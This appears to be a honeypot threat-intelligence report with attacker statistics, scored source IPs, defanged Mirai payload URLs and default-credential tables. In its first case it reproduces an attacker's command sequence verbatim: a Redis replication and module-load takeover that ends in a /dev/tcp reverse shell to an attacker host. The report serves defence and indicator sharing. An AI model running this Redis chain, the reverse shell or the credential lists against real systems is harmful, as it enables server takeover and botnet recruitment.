# Global threat evidence — what the sensor actually caught

Real, unsolicited attacks captured by the live Azure sensor from adversaries
around the world. Nothing here is generated or simulated: every IP, command,
credential and payload URL below was sent by a genuine external source and
recorded verbatim. Operator and test addresses are excluded throughout.

- **Snapshot:** 2026-08-17, ~3-day collection window
- **Geographic spread:** 163 geolocated attacker sources across **38 countries**
- **Payload URLs and C2 hosts are defanged** (`hxxp`, `[.]`) — the sensor
  recorded them, it never fetched them. Attacker **source** IPs are listed
  as-is; they are indicators of compromise, which is the point of the sensor.

---

## Where the attacks came from

Genuine attacker traffic by country (operator/test IPs removed):

| Country | Sources | Events |
|---|--:|--:|
| Indonesia | 4 | 2,228 |
| Pakistan | 4 | 901 |
| China | 24 | 843 |
| Germany | 7 | 303 |
| Sweden | 2 | 210 |
| India | 3 | 168 |
| Andorra | 1 | 136 |
| United States | 34 | 121 |
| Cambodia | 2 | 90 |
| South Korea | 2 | 90 |
| Netherlands | 14 | 75 |
| Hong Kong | 3 | 67 |
| Brazil | 6 | 43 |
| Argentina | 9 | 38 |

Volume concentrates in a few IoT-botnet hotspots; source *diversity* is widest
in the US, China and the Netherlands — the classic hosting-provider and
compromised-device mix.

---

## Top adversaries, scored and classified

| Source | Country | Network | Score | Class | Services |
|---|---|---|--:|---|---|
| `103.131.61.163` | Indonesia | PT. Newton Cipta Informatika | 100 | botnet-loader | telnet |
| `153.117.40.229` | Pakistan | Cyber Internet Services | 97 | botnet-loader | telnet |
| `206.183.111.36` | India | Web Werks India | 97 | botnet-loader | telnet |
| `45.198.224.26` | Sweden | VPSVAULT.HOST | 97 | botnet-loader | http/ssh/telnet |
| `110.37.16.237` | Pakistan | Wateen Telecom | 93 | botnet-loader | telnet |
| `45.79.123.76` | India | Akamai | 92 | **targeted-intrusion** | **all 7 services** |
| `110.240.165.61` | China | China Unicom Backbone | 92 | botnet-loader | telnet |
| `202.70.139.22` | Pakistan | Cyber Internet Services | 90 | botnet-loader | telnet |
| `112.156.166.41` | South Korea | LG Powercomm | 88 | botnet-loader | telnet |

`103.131.61.163` alone ran **1,569 commands across 2,815 events** — a single
Indonesian loader hammering the telnet bait for days.

---

## Case 1 — China · a live Redis module-load RCE

Source `116.162.216.223` (China Unicom) ran the current, sophisticated
unauthenticated-Redis takeover: abuse replication to plant a malicious module,
load it, and use it to run a reverse shell. Captured in order, verbatim:

```
$ config set dir .
$ config set dbfilename dump.rdb
$ CONFIG SET dir /tmp/
$ CONFIG SET dbfilename exp.so
$ SLAVEOF 203.57.109.214 60114        ← replicate a malicious module from the attacker
$ MODULE LOAD /tmp/exp.so             ← load it (retried 7×)
$ SLAVEOF NO ONE
$ system.exec "bash -c \"exec 6<>/dev/tcp/203.57.109.214/60114 && ...\""   ← reverse shell
$ system.exec "rm -rf /tmp/exp.so"    ← clean up the dropped module
$ MODULE UNLOAD system
```

Indicators captured:

- **Attacker C2 / replication master:** `203.57.109.214:60114`
- **Reverse-shell callback:** `hxxp` `/dev/tcp/203[.]57[.]109[.]214/60114`
- **Technique:** T1059 (Command & Scripting), T1053 persistence via loadable module

The sensor answered each command plausibly so the whole chain played out, and
executed none of it. This is exactly the intelligence a honeypot exists to
produce — a real actor's full RCE method, their infrastructure, and their
clean-up habit, handed over without risk.

---

## Case 2 — India · a seven-service targeted sweep

`45.79.123.76` (Akamai) is the only source classified **targeted-intrusion**
rather than botnet-loader, because it touched **every bait service** —
docker, ftp, http, mysql, redis, ssh and telnet — in one campaign. Its telnet
leg reached a shell twice, and among its probes was a **SIP `OPTIONS` scan**
(`CSeq: 42 OPTIONS`, `Contact: <sip:nm@nm>`) aimed at the Docker port — VoIP
reconnaissance riding along with the rest. A breadth of services from one source
is the signature the multi-service-sweep rule exists to catch.

---

## Case 3 — the botnet distribution network

A Chinese source pulled second-stage binaries from a live multi-architecture
Mirai CDN. The filenames map one-to-one to CPU targets — the loader fingerprints
the victim, then fetches the matching build:

```
hxxp://31[.]77[.]227[.]121/bins/parm      (ARM)
hxxp://31[.]77[.]227[.]121/bins/parm5     hxxp://.../parm7     hxxp://.../parm64
hxxp://31[.]77[.]227[.]121/bins/pmips     (MIPS)
hxxp://31[.]77[.]227[.]121/bins/psh4      (SuperH)
hxxp://31[.]77[.]227[.]121/bins/pspc      hxxp://.../pppc      (PowerPC)
hxxp://31[.]77[.]227[.]121/bins/pm68k     (Motorola 68k)
hxxp://31[.]77[.]227[.]121/bins/x86_64    (x86-64)
```

Other live payload hosts seen from genuine sources:
`hxxp://45[.]83[.]122[.]25/3nFTk7/init[.]sh` · `hxxp://b[.]9-9-8[.]com/t[.]sh`

---

## Case 4 — credentials, by origin

Real login attempts, showing two distinct playbooks by region:

| Country | Username | Password | Attempts |
|---|---|---|--:|
| Indonesia | enable | linuxshell | 40 |
| Germany | root | *(blank)* | 32 |
| Germany | sa | *(blank)* | 31 |
| Germany | admin | *(blank)* | 31 |
| Indonesia | root | admin | 24 |
| Indonesia | system | shell | 18 |
| Indonesia | root | vizxv | 14 |
| Indonesia | root | xc3511 | 12 |
| Indonesia | root | 888888 | 12 |

The Indonesian set (`vizxv`, `xc3511`, `888888`) is the Mirai hardcoded default
list — IoT botnet. The German `sa` / `admin` attempts are database-service
credential guessing from hosting infrastructure — a different actor with a
different goal, separated cleanly by the sensor.

---

## Why this matters

A honeypot's value is not that it was attacked — everything on a public IP is
attacked. It is that the attacks arrive *legible*: scored, classified, mapped to
technique, and replayable. The four cases above came out of the same pipeline
with no manual triage — a Redis RCE method, a multi-service intrusion, a botnet's
distribution infrastructure, and two regional credential playbooks, each turned
from raw packets into something an analyst can act on.

Deployable indicators from all of this export directly:

```bash
curl "http://localhost:8080/api/export/blocklist?min_score=60"   # IPs
curl "http://localhost:8080/api/export/stix?min_score=60"        # STIX 2.1
```
